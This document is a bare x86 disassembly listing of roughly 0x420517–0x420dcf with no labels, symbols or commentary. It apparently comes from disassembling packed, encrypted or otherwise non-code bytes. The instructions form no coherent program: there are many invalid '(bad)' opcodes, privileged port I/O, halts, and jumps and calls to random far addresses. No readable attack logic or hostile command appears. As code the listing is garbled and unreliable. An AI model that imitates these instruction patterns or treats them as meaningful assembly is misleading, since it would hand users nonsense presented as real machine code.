  420517:	fcmovu st,st(2)
  420519:	aam    0xff
  42051b:	(bad)  
  42051d:	pop    es
  42051e:	dec    al
  420520:	faddp  st(6),st
  420522:	fsub   st(1),st
  420524:	mov    ecx,0xe7d2eae6
  420529:	(bad)
  42052c:	out    dx,al
  42052d:	out    dx,eax
  42052e:	div    ebp
  420530:	(bad)  
  420531:	sar    DWORD PTR [ebp+ecx*8-0x1d0b1d20],1
  420538:	fdiv   st(3),st
  42053a:	add    al,al
  42053c:	leave  
  42053d:	loopne 0x420514
  42053f:	add    eax,ecx
  420541:	or     al,0xef
  420543:	les    esi,FWORD PTR [ebx-0x4f151222]
  420549:	repnz test eax,0xb5d6c9c4
  42054f:	fcomi  st,st(3)
  420551:	mov    dh,0xd5
  420553:	imul   ah
  420555:	stc    
  420556:	iret   
  420557:	(bad)  
  420559:	mov    edx,0xd7e1e5e7
  42055e:	out    dx,eax
  42055f:	in     eax,0xd8
  420561:	loope  0x42055d
  420563:	out    dx,al
  420564:	in     eax,0xa6
  420566:	iret   
  420567:	(bad)  
  420568:	mul    bh
  42056a:	in     eax,dx
  42056b:	mov    ah,0xca
  42056d:	fxch   st(4)
  42056f:	(bad)  
  420570:	fst    st(5)
  420572:	fst    st(4)
  420574:	out    dx,eax
  420575:	mov    esi,0xbfdfbed
  42057a:	out    0xf8,eax
  42057c:	add    ah,bh
  42057e:	iret   
  42057f:	add    al,BYTE PTR [ebx]
  420581:	or     cl,BYTE PTR ds:0xdfc6d0e5
  420587:	fisubr WORD PTR [esi-0x484f3336]
  42058d:	cli    
  42058e:	out    0xf7,eax
  420590:	clc    
  420591:	aam    0xcd
  420593:	mov    esp,0xcdede3d6
  420598:	test   esp,0xdd0907dd
  42059e:	cli    
  42059f:	fnsetpm(287 only) 
  4205a1:	call   0xa72510af
  4205a6:	icebp  
  4205a7:	repz cmc 
  4205a9:	call   0xec2dd09f
  4205ae:	out    0xed,al
  4205b0:	(bad)  
  4205b2:	fcomi  st,st(3)
  4205b4:	hlt    
  4205b5:	aam    0x3
  4205b7:	cld    
  4205b8:	(bad)  
  4205b9:	jecxz  0x4205c1
  4205bb:	ret    0xfc2
  4205be:	iret   
  4205bf:	iret   
  4205c0:	lsl    eax,sp
  4205c3:	shl    edx,cl
  4205c5:	fmul   st(1),st
  4205c7:	(bad)  
  4205c8:	out    dx,eax
  4205c9:	int    0xf5
  4205cb:	retf   
  4205cc:	aad    0xc6
  4205ce:	fnstcw WORD PTR [edi-0x452b1c34]
  4205d4:	leave  
  4205d5:	out    dx,al
  4205d6:	hlt    
  4205d7:	add    dh,ah
  4205d9:	(bad)  
  4205da:	(bad)  
  4205dc:	mov    edi,0xed02e20f
  4205e1:	sti    
  4205e2:	push   cs
  4205e3:	les    ebp,FWORD PTR [ebp-0x32352819]
  4205e9:	lock les ebp,FWORD PTR [eax-0x2649084a]
  4205f0:	(bad)  
  4205f1:	mov    dl,0xcc
  4205f3:	stc    
  4205f4:	cli    
  4205f5:	mov    ecx,0xe7fdf6fe
  4205fa:	aad    0xdf
  4205fc:	icebp  
  4205fd:	neg    dh
  4205ff:	(bad)  
  420601:	ret    0x9e0
  420604:	int3   
  420605:	icebp  
  420606:	mov    bl,0xef
  420608:	lods   eax,DWORD PTR ds:[esi]
  420609:	retf   0xd9db
  42060c:	mov    edx,0xd1e8b8cc
  420611:	cli    
  420612:	shl    ecx,1
  420614:	mov    esp,0xbdf2fdfe
  420619:	div    edx
  42061b:	add    al,0xfb
  42061d:	in     al,0xea
  42061f:	leave  
  420620:	out    dx,al
  420621:	pop    es
  420622:	jmp    0x4205f1
  420624:	loope  0x4205f0
  420626:	int3   
  420627:	jmp    0xd012b0f0
  42062c:	div    ch
  42062e:	mov    dh,0xdf
  420630:	les    edi,FWORD PTR [esi+0x7bdd7cf]
  420636:	int3   
  420637:	mov    esp,0xded702dc
  42063c:	cmc    
  42063d:	fcomp  st(7)
  42063f:	fadd   DWORD PTR [edx+ecx*1]
  420642:	sar    ebp,0xb8
  420645:	int    0xe6
  420647:	int    0xac
  420649:	in     eax,dx
  42064a:	(bad)  
  42064b:	jmp    0x420623
  42064d:	mul    dh
  42064f:	iret   
  420650:	lock mov ch,0xff
  420653:	mov    eax,0xd9e1d3fc
  420658:	aad    0xf5
  42065a:	stc    
  42065b:	cli    
  42065c:	fucomp st(2)
  42065e:	jecxz  0x42063b
  420660:	or     ch,bl
  420662:	out    0xfe,al
  420664:	icebp  
  420665:	lods   al,BYTE PTR ds:[esi]
  420666:	loope  0x420646
  420668:	mov    bh,0xe5
  42066a:	lods   eax,DWORD PTR ds:[esi]
  42066b:	call   0xe61dcf41
  420670:	shl    DWORD PTR [esi+0x1cee3f5],1
  420676:	(bad)  
  420677:	faddp  st(0),st
  420679:	(bad)  
  42067b:	mov    esp,0xf50edad6
  420680:	(bad)  
  420681:	(bad)  
  420683:	retf   
  420684:	shr    DWORD PTR [edx-0x3d1c5358],cl
  42068a:	in     eax,dx
  42068b:	retf   0xd7ca
  42068e:	mov    al,0xfb
  420690:	(bad)  
  420692:	(bad)  
  420693:	hlt    
  420694:	int    0xbd
  420696:	rol    bh,1
  420698:	pop    es
  420699:	icebp  
  42069a:	add    ch,bh
  42069c:	rol    dh,1
  42069e:	add    al,dh
  4206a0:	std    
  4206a1:	jmp    0x420690
  4206a3:	or     BYTE PTR [esi-0x323e2f28],ch
  4206a9:	fcmovne st,st(4)
  4206ab:	jmp    0xe506f667
  4206b0:	idiv   ebp
  4206b2:	mov    esi,0xf6c1dabc
  4206b7:	cli    
  4206b8:	fidivr DWORD PTR [ebx+ebx*8-0x180401]
  4206bf:	(bad)  
  4206c0:	hlt    
  4206c1:	or     eax,0xd3cbeffb
  4206c6:	fcomip st,st(0)
  4206c8:	out    0xea,al
  4206ca:	out    0xef,al
  4206cc:	cli    
  4206cd:	(bad)
  4206d0:	iret   
  4206d1:	in     al,0xd8
  4206d3:	add    ecx,ebp
  4206d5:	fidivr WORD PTR [ebp-0x383ffc25]
  4206db:	shl    cl,0xc4
  4206de:	cli    
  4206df:	retf   0xe80d
  4206e2:	std    
  4206e3:	adc    DWORD PTR [ebp-0x10174f19],ebp
  4206e9:	xlat   BYTE PTR ds:[ebx]
  4206ea:	lods   eax,DWORD PTR ds:[esi]
  4206eb:	out    dx,al
  4206ec:	scas   eax,DWORD PTR es:[edi]
  4206ed:	(bad)  
  4206ee:	jmp    0xf52fd7ce
  4206f3:	xlat   BYTE PTR ds:[ebx]
  4206f4:	clc    
  4206f5:	stc    
  4206f6:	fsub   st,st(5)
  4206f8:	fmulp  st(4),st
  4206fa:	idiv   dh
  4206fc:	out    0xf6,al
  4206fe:	aad    0xdd
  420700:	add    esp,ebx
  420702:	add    eax,0xd1ddafe8
  420707:	mov    ebp,0xcae7bcd4
  42070c:	mov    ch,0xe9
  42070e:	mov    ecx,0xecffb9e9
  420713:	repz int3 
  420715:	shl    eax,0xd6
  420718:	pop    es
  420719:	add    BYTE PTR [edx],cl
  42071b:	icebp  
  42071c:	rol    DWORD PTR ds:0xeac4dcfd,1
  420722:	out    dx,al
  420723:	out    dx,al
  420724:	in     eax,0xe6
  420726:	loope  0x4206f4
  420728:	retf   0xf3c3
  42072b:	lds    esi,FWORD PTR [esi+eax*8-0x2610472d]
  420732:	jmp    0xc106:0xfef9c3d2
  420739:	sti    
  42073a:	mov    ebp,0xeaebc6d1
  42073f:	out    dx,eax
  420740:	into   
  420741:	out    0xc1,eax
  420743:	jmp    0xd7dd:0xe4d2d1c0
  42074a:	rcl    esp,cl
  42074c:	sti    
  42074d:	jmp    0x420714
  42074f:	mov    edi,0xf1ddcaf6
  420754:	(bad)  
  420756:	out    0xe6,al
  420758:	clc    
  420759:	fimul  WORD PTR [ebx]
  42075b:	bnd jmp 0x10240c44
  420761:	add    DWORD PTR [edi],eax
  420763:	retf   0xefc4
  420766:	fnsave [eax-0xc3f1217]
  42076c:	leave  
  42076d:	enter  0xfff2,0xfd
  420771:	ror    al,cl
  420773:	test   BYTE PTR [eax],0xfb
  420776:	mov    esi,0xd1c606bd
  42077b:	(bad)  
  42077e:	leave  
  42077f:	fdivp  st(6),st
  420781:	in     eax,0xda
  420783:	add    ecx,ecx
  420785:	mov    al,0xbe
  420787:	mov    esi,0xcddab7f0
  42078c:	aad    0xe7
  42078e:	in     al,dx
  42078f:	sti    
  420790:	int3   
  420791:	(bad)  
  420792:	mov    edx,0xf5decdbb
  420797:	cli    
  420798:	mov    ebx,0xd7c4c2c3
  42079d:	aad    0xc4
  42079f:	call   0xef4ccfae
  4207a4:	fcomip st,st(7)
  4207a6:	mov    bl,0xd0
  4207a8:	ret    
  4207a9:	mov    al,0xc7
  4207ab:	retf   0xaeaf
  4207ae:	(bad)  
  4207af:	iret   
  4207b0:	retf   0xd2bf
  4207b3:	mov    esi,0x201d4f5
  4207b8:	idiv   ch
  4207ba:	rcl    bh,1
  4207bc:	imul   ecx
  4207be:	or     ah,dl
  4207c0:	jmp    0xa84af0c6
  4207c5:	ret    0xc1f3
  4207c8:	mov    cl,0xee
  4207ca:	mov    bl,0xfa
  4207cc:	mov    al,0xda
  4207ce:	jmp    FWORD PTR [edx+edx*8-0xc082429]
  4207d5:	neg    esi
  4207d7:	repz std 
  4207d9:	clc    
  4207da:	icebp  
  4207db:	rol    bh,0xe3
  4207de:	paddw  mm7,mm1
  4207e1:	fisttp WORD PTR [eax]
  4207e3:	int3   
  4207e4:	repnz lods eax,DWORD PTR ds:[esi]
  4207e6:	scas   al,BYTE PTR es:[edi]
  4207e7:	ret    0xc9ca
  4207ea:	jmp    0xf1b6:0xdfd6efb2
  4207f1:	mov    edi,0xefbcecea
  4207f6:	out    0xf5,eax
  4207f8:	mov    ebx,0xc3fbd4f5
  4207fd:	(bad)  
  4207ff:	cmc    
  420800:	loop   0x4207fd
  420802:	adc    dl,BYTE PTR [edx]
  420804:	lock retf 0xd5de
  420808:	mov    bl,0xc7
  42080a:	in     eax,dx
  42080b:	jmp    0x3db:0xd0dbf2ed
  420812:	int    0xdb
  420814:	std    
  420815:	loop   0x4207e4
  420817:	loopne 0x420816
  420819:	(bad)  
  42081a:	div    ah
  42081c:	jecxz  0x4207f4
  42081e:	or     al,BYTE PTR [ebx]
  420820:	ret    
  420821:	retf   0xe7e9
  420824:	shr    BYTE PTR [edi+ebx*8-0x2d4a2c09],1
  42082b:	in     al,dx
  42082c:	stc    
  42082d:	shl    ebx,cl
  42082f:	(bad)  
  420830:	lock mov ah,0xd5
  420833:	std    
  420834:	cld    
  420835:	rcr    esp,1
  420837:	add    BYTE PTR [ebx],al
  420839:	fcompp 
  42083b:	loope  0x420820
  42083d:	rol    eax,0xe7
  420840:	loop   0x420846
  420842:	leave  
  420843:	call   0xb1f9baf9
  420848:	mov    bh,0xbc
  42084a:	hlt    
  42084b:	jmp    0xcb26cd20
  420850:	in     al,0xb4
  420852:	mov    ch,0xb0
  420854:	in     al,dx
  420855:	icebp  
  420856:	mov    edi,0xbadbff
  42085b:	clc    
  42085c:	out    0x1,eax
  42085e:	(bad)  
  42085f:	stc    
  420860:	(bad)  
  420861:	in     al,dx
  420862:	retf   0xf10e
  420865:	mov    esp,0xd5b5aec1
  42086a:	jecxz  0x420834
  42086c:	fneni(8087 only) 
  42086e:	enter  0xccf4,0x3
  420872:	icebp  
  420873:	retf   0xc3d9
  420876:	jecxz  0x42087e
  420878:	rcr    cl,cl
  42087a:	cld    
  42087b:	add    dl,dh
  42087d:	out    dx,eax
  42087e:	(bad)  
  420880:	retf   
  420881:	push   cs
  420882:	loopne 0x420861
  420884:	lods   al,BYTE PTR ds:[esi]
  420885:	lods   eax,DWORD PTR ds:[esi]
  420886:	mov    esp,0xf6d7d5c9
  42088b:	enter  0xedc8,0xf2
  42088f:	aam    0xdb
  420891:	mov    ecx,0xbdc2d4d9
  420896:	aam    0xee
  420898:	div    ecx
  42089a:	fcmovu st,st(3)
  42089c:	cld    
  42089d:	or     ah,al
  42089f:	add    ecx,DWORD PTR [ecx*1-0x2d33153c]
  4208a6:	mov    esi,0xe7b3b3ce
  4208ab:	out    0xcb,eax
  4208ad:	fsin   
  4208af:	mov    eax,0xd202fde8
  4208b4:	lock lock mov eax,0xc0d1fd
  4208bb:	xlat   BYTE PTR ds:[ebx]
  4208bc:	in     eax,0xfe
  4208be:	cmc    
  4208bf:	std    
  4208c0:	enter  0xe8c6,0xcf
  4208c4:	mov    dl,0xcd
  4208c6:	(bad)  
  4208c7:	mov    bh,0xeb
  4208c9:	ret    0xd5ee
  4208cc:	call   0xbdfcc29d
  4208d1:	add    eax,DWORD PTR [edx]
  4208d3:	fistp  QWORD PTR [esi-0x430f2a47]
  4208d9:	jmp    0x4208ab
  4208db:	loope  0x4208e1
  4208dd:	rol    DWORD PTR ds:0xe02ecf9,0xf8
  4208e4:	out    dx,eax
  4208e5:	mov    ebp,0xead2b3a8
  4208ea:	shl    dl,0xb7
  4208ed:	int    0xe9
  4208ef:	in     eax,dx
  4208f0:	sar    DWORD PTR [ebp-0x2847fd33],1
  4208f6:	sar    al,cl
  4208f8:	(bad)  
  4208fa:	in     eax,0xff
  4208fc:	rcr    al,1
  4208fe:	(bad)  
  4208ff:	jmp    0x4208dc
  420901:	out    dx,eax
  420902:	pop    es
  420903:	rcl    bl,cl
  420905:	mov    cl,0xc1
  420907:	jecxz  0x4208b5
  420909:	loopne 0x4208dd
  42090b:	mov    bh,0xee
  42090e:	fcom   st(3)
  420910:	std    
  420911:	mov    ebp,0xe1d5efb9
  420916:	fcmovbe st,st(5)
  420918:	push   es
  420919:	pop    es
  42091a:	mov    ebp,0xdfdfbfff
  42091f:	(bad)  
  420921:	jmp    0x420930
  420923:	add    ebp,ebx
  420925:	in     al,0xe1
  420927:	mov    esp,0xd4bbd1f6
  42092c:	clc    
  42092d:	mov    ah,0xf1
  42092f:	leave  
  420930:	stc    
  420931:	fdivr  st(0),st
  420933:	int3   
  420934:	hlt    
  420935:	mov    edx,0xe6f6f4e1
  42093a:	sar    eax,cl
  42093c:	jmp    0xee13:0xdc090200
  420943:	add    al,0xb3
  420945:	mov    esp,0xb4f3c3ed
  42094a:	loopne 0x420911
  42094c:	mov    ebx,0xc5fee9cd
  420951:	fdivr  st(4),st
  420953:	jmp    0xd2d0:0xf6d2f4d6
  42095a:	jmp    0x420930
  42095c:	sti    
  42095d:	pmulhuw mm0,mm7
  420960:	pop    es
  420961:	leave  
  420962:	in     al,dx
  420963:	call   0xad25cf19
  420968:	cmc    
  420969:	mov    ch,0xe7
  42096b:	mov    cl,0xd9
  42096d:	jmp    0xc9f2:0xd9dfccfa
  420974:	fdivr  st,st(4)
  420976:	in     eax,dx
  420977:	add    eax,0x4e1d9d1
  42097c:	rcl    esp,1
  42097e:	(bad)  
  420980:	in     eax,dx
  420981:	into   
  420982:	add    DWORD PTR [esi],ecx
  420984:	repnz mov al,0xee
  420987:	mov    bl,0xd2
  420989:	in     al,0xb6
  42098b:	mov    bl,0xce
  42098d:	hlt    
  42098e:	in     al,0xdb
  420990:	jmp    0xdb07:0x201c3f9
  420997:	hlt    
  420998:	int3   
  420999:	test   BYTE PTR [ecx],0x2
  42099c:	add    edi,DWORD PTR [esi-0x11013416]
  4209a2:	(bad)  
  4209a3:	shl    edx,cl
  4209a5:	(bad)  
  4209a6:	in     al,dx
  4209a7:	fnsave [ebx-0x25354c0e]
  4209ad:	int    0xb1
  4209af:	jmp    0x420965
  4209b1:	out    dx,eax
  4209b2:	cmc    
  4209b3:	mov    ebx,0xf2e707d2
  4209b8:	aad    0x0
  4209ba:	(bad)  
  4209bb:	cld    
  4209bc:	call   0xf94d1891
  4209c1:	enter  0xfe0c,0xdf
  4209c5:	rcl    bh,cl
  4209c7:	in     eax,dx
  4209c8:	loopne 0x42098f
  4209ca:	(bad)  
  4209cb:	stc    
  4209cc:	shl    esi,0xd3
  4209cf:	out    dx,al
  4209d0:	cli    
  4209d1:	rcr    eax,1
  4209d3:	fnstcw WORD PTR [edi-0x3cff2144]
  4209d9:	loope  0x42099d
  4209db:	aad    0xd0
  4209dd:	add    DWORD PTR [eax],ecx
  4209df:	fmul   DWORD PTR [edi+ebp*8]
  4209e2:	jmp    0x4209eb
  4209e4:	mov    edi,0xe2b2cbe7
  4209e9:	(bad)  
  4209ea:	out    0xac,al
  4209ec:	retf   
  4209ed:	mov    ecx,0xd2cdbab0
  4209f2:	fsubr  st(3),st
  4209f4:	loop   0x4209b2
  4209f6:	out    0xd9,al
  4209f8:	cli    
  4209f9:	add    eax,0xebcafdea
  4209fe:	cmc    
  4209ff:	fiadd  WORD PTR [edi]
  420a01:	out    0xb,eax
  420a03:	pop    es
  420a04:	ret    0xa9c3
  420a07:	test   edi,0xb0b7b6ec
  420a0d:	lds    esi,FWORD PTR [eax-0x2907214a]
  420a13:	ret    0xf2de
  420a16:	out    dx,al
  420a17:	cmc    
  420a18:	(bad)  
  420a1a:	(bad)  
  420a1c:	or     cl,ch
  420a1e:	enter  0x7ee,0xe
  420a22:	add    al,0x3
  420a24:	fnsave [ebx-0x4d1a4e2a]
  420a2a:	in     eax,dx
  420a2b:	mov    bl,0xf1
  420a2d:	fstp   TBYTE PTR [ebx-0x54b4636]
  420a33:	ror    dh,cl
  420a35:	(bad)  
  420a36:	mov    esi,0xcbe4faf4
  420a3b:	jmp    0xf93afb29
  420a40:	leave  
  420a41:	jmp    0xc9ca:0xbdb3eee2
  420a48:	in     al,0xbc
  420a4a:	aad    0xb0
  420a4c:	cmc    
  420a4d:	in     eax,0xd1
  420a4f:	call   0xf712f523
  420a54:	idiv   DWORD PTR [eax-0x423c242b]
  420a5a:	cld    
  420a5b:	(bad)  
  420a5c:	hlt    
  420a5d:	add    eax,ebp
  420a5f:	or     esi,ebp
  420a61:	add    al,0xed
  420a63:	or     DWORD PTR [edi-0x3535323e],ebp
  420a69:	out    0xeb,eax
  420a6b:	mov    bl,0xe8
  420a6d:	clc    
  420a6e:	mov    edi,0xb8fbe8d6
  420a73:	repz mov edx,0xecf5c7bc
  420a79:	clc    
  420a7a:	(bad)  
  420a7b:	icebp  
  420a7c:	add    edi,edx
  420a7e:	(bad)  
  420a80:	stc    
  420a81:	dec    dh
  420a83:	or     al,cl
  420a85:	shl    BYTE PTR [ebx-0x38114342],0xb5
  420a8c:	out    dx,eax
  420a8d:	fcmovbe st,st(3)
  420a8f:	(bad)  
  420a91:	lock add ebx,ecx
  420a94:	loopne 0x420a79
  420a96:	out    0xff,al
  420a98:	repz add BYTE PTR [ebx],al
  420a9b:	(bad)  
  420a9d:	jmp    0x420a63
  420a9f:	out    0xe,eax
  420aa1:	add    dh,bl
  420aa3:	adc    esi,DWORD PTR [ecx-0x3c15563e]
  420aa9:	mov    dl,0xc6
  420aab:	iret   
  420aac:	mov    ah,0xf9
  420aae:	enter  0xc9b9,0xf1
  420ab2:	in     eax,dx
  420ab3:	neg    dl
  420ab5:	mov    edi,0xe1f1c7db
  420aba:	out    0xf2,al
  420abc:	hlt    
  420abd:	neg    cl
  420abf:	in     al,0xc9
  420ac1:	add    al,0xe4
  420ac3:	add    eax,0xf7ecefc8
  420ac8:	(bad)  [ebp-0x132f2b45]
  420ace:	(bad)  
  420acf:	xlat   BYTE PTR ds:[ebx]
  420ad0:	hlt    
  420ad1:	leave  
  420ad2:	add    dl,ah
  420ad4:	mov    ebp,0xdef8db03
  420ad9:	jmp    0x420aa2
  420adb:	fdiv   st(3),st
  420add:	add    DWORD PTR [ebp-0x37f01d37],edi
  420ae3:	icebp  
  420ae4:	repnz lock mov esi,0xecfbcbe3
  420aeb:	shr    esp,cl
  420aed:	enter  0xb7b8,0xe5
  420af1:	rol    DWORD PTR [ebx],1
  420af3:	jecxz  0x420ae9
  420af5:	repnz rcr ah,1
  420af8:	loopne 0x420ad7
  420afa:	jmp    0xfbe4:0xc0e6c902
  420b01:	aam    0xe8
  420b03:	int3   
  420b04:	lock repnz scas eax,DWORD PTR es:[edi]
  420b07:	fstp   st(4)
  420b09:	test   esi,0xf6f9e5f6
  420b0f:	rcr    bl,1
  420b11:	in     al,dx
  420b12:	xlat   BYTE PTR ds:[ebx]
  420b13:	sar    dh,cl
  420b15:	clc    
  420b16:	std    
  420b17:	loop   0x420af4
  420b19:	pop    es
  420b1a:	fdivr  st,st(4)
  420b1c:	jmp    0xe907:0xd5edbdef
  420b23:	or     bl,ch
  420b25:	lods   al,BYTE PTR ds:[esi]
  420b26:	iret   
  420b27:	retf   
  420b28:	in     eax,0xd0
  420b2a:	xlat   BYTE PTR ds:[ebx]
  420b2b:	sti    
  420b2c:	sar    DWORD PTR [edx-0x2e010b50],cl
  420b32:	mov    esp,0xf7bcfeb4
  420b37:	mov    edi,0xc3d6e6cc
  420b3c:	add    edi,edi
  420b3e:	enter  0xffd4,0x4
  420b42:	jecxz  0x420b41
  420b44:	mov    dl,0xca
  420b46:	in     al,0xd1
  420b48:	jmp    0xe630db37
  420b4d:	stc    
  420b4e:	mov    bh,0xef
  420b50:	jmp    0xbeb9:0xf5cccdf2
  420b57:	loop   0x420b15
  420b59:	(bad)
  420b5c:	loop   0x420b3c
  420b5e:	out    dx,al
  420b5f:	fcmovu st,st(6)
  420b61:	mov    ah,0xdc
  420b64:	call   0xc713d757
  420b69:	call   0xdaf7d23d
  420b6e:	repnz (bad) 
  420b70:	lock mov esi,0xcdf8f2
  420b76:	aad    0xb8
  420b78:	mov    ebp,0xae70ae7
  420b7d:	clc    
  420b7e:	add    esp,ebp
  420b80:	loope  0x420b80
  420b82:	in     eax,0xe8
  420b84:	sar    DWORD PTR [esi-0x4b170e0d],1
  420b8a:	mov    dh,0xec
  420b8c:	mov    ecx,0xeaf4dfbb
  420b91:	clc    
  420b92:	inc    DWORD PTR [ecx]
  420b94:	mov    bh,0xc8
  420b96:	mov    edi,0xd6d5d0ee
  420b9b:	retf   0xbd9
  420b9e:	ftst   
  420ba0:	retf   
  420ba1:	add    edi,edx
  420ba3:	in     al,0xbc
  420ba5:	mov    eax,0xe1c2debd
  420baa:	mov    ah,0xac
  420bac:	int3   
  420bad:	mov    dl,0xd2
  420baf:	jmp    0xf7d7:0xc3baf0cb
  420bb6:	rol    BYTE PTR [esi],cl
  420bb8:	std    
  420bb9:	hlt    
  420bba:	jmp    0xea02:0xdbc402b8
  420bc1:	add    bl,bl
  420bc3:	fdivr  DWORD PTR [edi-0x33502142]
  420bc9:	lods   eax,DWORD PTR ds:[esi]
  420bca:	enter  0xf3e4,0xb5
  420bce:	lock imul ah
  420bd1:	jmp    0xf643e9bf
  420bd6:	aad    0xd4
  420bd8:	fld    QWORD PTR [esi]
  420bda:	cmc    
  420bdb:	loopne 0x420bc4
  420bdd:	(bad)  
  420bde:	faddp  st(0),st
  420be0:	retf   0xce09
  420be3:	adc    DWORD PTR [edx-0xc3a1f3b],ebp
  420be9:	in     eax,0xd7
  420beb:	(bad)  
  420bec:	fnstenv [esi-0x43021a13]
  420bf2:	mov    ebx,0xc1feeff4
  420bf7:	ret    0xfb
  420bfa:	sar    dl,0xf8
  420bfd:	fucom  st(3)
  420bff:	(bad)  
  420c00:	iret   
  420c01:	loop   0x420bd2
  420c03:	jmp    0xcfe2:0xc2c3e7f3
  420c0a:	xlat   BYTE PTR ds:[ebx]
  420c0b:	imul   ch
  420c0d:	hlt    
  420c0e:	enter  0xfdfb,0xef
  420c12:	int    0xb8
  420c14:	idiv   BYTE PTR [edi-0x2f39041e]
  420c1a:	or     bh,dl
  420c1c:	ror    edx,1
  420c1e:	pop    es
  420c1f:	iret   
  420c20:	iret   
  420c21:	in     eax,0xed
  420c23:	out    dx,al
  420c24:	in     al,dx
  420c25:	mov    ebp,0xb6b3bde1
  420c2a:	jmp    0xf0da:0xfaf6c9b5
  420c31:	add    edi,esi
  420c33:	in     eax,dx
  420c34:	mov    edx,0xdccec2ff
  420c39:	mov    esi,0xf9c2d4fe
  420c3e:	(bad)  
  420c3f:	cli    
  420c40:	in     al,dx
  420c41:	int3   
  420c42:	cld    
  420c43:	push   cs
  420c44:	repz out 0xca,al
  420c47:	out    dx,eax
  420c48:	out    0xcf,eax
  420c4a:	cli    
  420c4b:	loop   0x420c1e
  420c4d:	rcl    ebp,1
  420c4f:	mov    ch,0xf4
  420c51:	out    dx,al
  420c52:	aam    0xb4
  420c54:	loop   0x420c4e
  420c56:	sar    dh,1
  420c58:	ret    0x4bc
  420c5b:	stc    
  420c5c:	mov    edi,0xde06cfef
  420c61:	or     dh,bl
  420c63:	repnz sar DWORD PTR [esi+ebx*8-0x1f1a4839],cl
  420c6b:	out    dx,eax
  420c6c:	out    dx,eax
  420c6d:	cmc    
  420c6e:	out    0xf5,eax
  420c70:	mov    bh,0xf5
  420c72:	add    dh,al
  420c74:	int3   
  420c75:	loope  0x420c37
  420c77:	aam    0xe6
  420c79:	add    ecx,DWORD PTR [edx]
  420c7b:	fadd   QWORD PTR [ecx]
  420c7d:	jmp    0x420c4a
  420c7f:	clc    
  420c80:	stc    
  420c81:	fcmovu st,st(1)
  420c83:	push   es
  420c84:	int3   
  420c85:	icebp  
  420c86:	leave  
  420c87:	faddp  st(7),st
  420c89:	fsubr  st(3),st
  420c8b:	jmp    0x420c3c
  420c8d:	mov    ah,0xd5
  420c8f:	(bad)  
  420c90:	aad    0xcb
  420c92:	enter  0xeed9,0xe2
  420c96:	(bad)  
  420c97:	clc    
  420c98:	aad    0xc0
  420c9a:	(bad)  
  420c9c:	call   0xc84cfba1
  420ca1:	movhlps xmm5,xmm1
  420ca4:	loopne 0x420c4c
  420ca6:	retf   0xc0e4
  420ca9:	icebp  
  420caa:	ret    0xb2e6
  420cad:	mov    dl,0xf0
  420caf:	mov    eax,0xddc9f2fe
  420cb4:	jecxz  0x420cbd
  420cb6:	clc    
  420cb7:	inc    dl
  420cb9:	mov    edx,0xf08dfd0
  420cbe:	(bad)  
  420cc0:	add    DWORD PTR [ecx*8-0x1f2c2000],eax
  420cc7:	mov    dh,0xf4
  420cc9:	lods   al,BYTE PTR ds:[esi]
  420cca:	repnz repz (bad) 
  420cce:	sar    DWORD PTR [ebx-0x450c1549],1
  420cd4:	mov    esi,0xf0dcf2f7
  420cd9:	in     al,0xdc
  420cdb:	sti    
  420cdc:	lock loope 0x420ce4
  420cdf:	out    0xd5,al
  420ce1:	add    al,0xcc
  420ce3:	push   es
  420ce4:	ret    
  420ce5:	lods   al,BYTE PTR ds:[esi]
  420ce6:	enter  0xd5bc,0xb6
  420cea:	cli    
  420ceb:	sti    
  420cec:	rcr    al,0xe9
  420cef:	stc    
  420cf0:	(bad)  
  420cf1:	shl    edx,1
  420cf3:	add    ebx,edi
  420cf5:	into   
  420cf6:	clc    
  420cf7:	sar    bh,0xf8
  420cfa:	aad    0xa
  420cfc:	(bad)  
  420cfd:	sti    
  420cfe:	(bad)  
  420cff:	in     eax,0x4
  420d01:	push   es
  420d02:	or     al,BYTE PTR [edi]
  420d04:	shl    ah,cl
  420d06:	loop   0x420cd6
  420d08:	jmp    0xce0af6f8
  420d0d:	sti    
  420d0e:	sar    DWORD PTR [edx-0x122b0635],1
  420d14:	(bad)  
  420d15:	mov    eax,0xded1bfd9
  420d1a:	(bad)  
  420d1b:	(bad)  
  420d1c:	fxch   st(1)
  420d1e:	leave  
  420d1f:	add    eax,0xd8e7e5e4
  420d24:	ret    
  420d25:	mov    esi,0xd0bdcbf1
  420d2a:	cmc    
  420d2b:	xlat   BYTE PTR ds:[ebx]
  420d2c:	mov    bl,0xbb
  420d2e:	(bad)  
  420d2f:	int3   
  420d30:	jmp    0xd614e328
  420d35:	cld    
  420d36:	repz test BYTE PTR [eax],0xe4
  420d3a:	inc    DWORD PTR [edi]
  420d3c:	shr    ecx,0xea
  420d3f:	jmp    0x420d2d
  420d41:	jmp    0x420d26
  420d43:	(bad)  
  420d45:	mov    dl,0xe0
  420d47:	(bad)
  420d4b:	mov    ch,0xda
  420d4d:	mov    cl,0xb9
  420d4f:	rcl    bl,cl
  420d51:	cmc    
  420d52:	div    ah
  420d54:	fcmovbe st,st(3)
  420d56:	sti    
  420d57:	(bad)  
  420d58:	clc    
  420d59:	fadd   DWORD PTR [esi]
  420d5b:	aam    0xf7
  420d5d:	fmul   DWORD PTR [ecx]
  420d5f:	fucomi st,st(6)
  420d61:	add    ch,ah
  420d63:	add    ecx,ebx
  420d65:	jmp    0xcbf3:0xe1d4e9a8
  420d6c:	call   0xee37fc58
  420d71:	mov    dl,0xb8
  420d73:	jmp    0xfd:0xdc02bdc8
  420d7a:	(bad)  
  420d7b:	repnz (bad) 
  420d7e:	(bad)  
  420d7f:	inc    edi
  420d81:	push   cs
  420d82:	repz sar BYTE PTR [eax-0x8344e58],0xaa
  420d8a:	out    dx,al
  420d8b:	in     al,0xf4
  420d8d:	sti    
  420d8e:	(bad)  
  420d90:	out    dx,al
  420d91:	inc    BYTE PTR [ebx]
  420d93:	leave  
  420d94:	inc    eax
  420d96:	mov    ebp,0xf7dcf2ed
  420d9b:	or     DWORD PTR [edx],ecx
  420d9d:	inc    DWORD PTR [eax]
  420d9f:	jmp    0x420da0
  420da1:	call   0xd41af5b1
  420da6:	in     al,dx
  420da7:	jmp    0x420d85
  420da9:	out    0xf4,al
  420dab:	shr    ebx,cl
  420dad:	hlt    
  420dae:	in     eax,0xd8
  420db0:	int3   
  420db1:	mov    ebx,0xe3d2f3c9
  420db6:	out    dx,al
  420db7:	out    0xc7,eax
  420db9:	stc    
  420dba:	(bad)  
  420dbb:	neg    bl
  420dbd:	fcmovne st,st(2)
  420dbf:	add    ah,dl
  420dc1:	(bad)  
  420dc2:	call   0xa8e8fcb2
  420dc7:	(bad)
  420dca:	out    0xef,al
  420dcc:	retf   0xd7cd
  420dcf:	sti    
